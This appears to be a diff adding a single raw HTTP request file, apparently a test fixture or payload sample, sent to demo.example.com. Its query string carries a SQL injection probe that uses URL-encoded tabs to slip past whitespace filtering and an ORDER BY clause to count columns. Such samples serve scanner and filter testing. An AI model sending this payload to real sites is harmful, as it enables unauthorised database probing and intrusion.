@@ -1,0 +1,4 @@
+GET /a?q=1'%09order%09by%0910--%09- HTTP/1.1
+Host: demo.example.com
+Connection: close
+
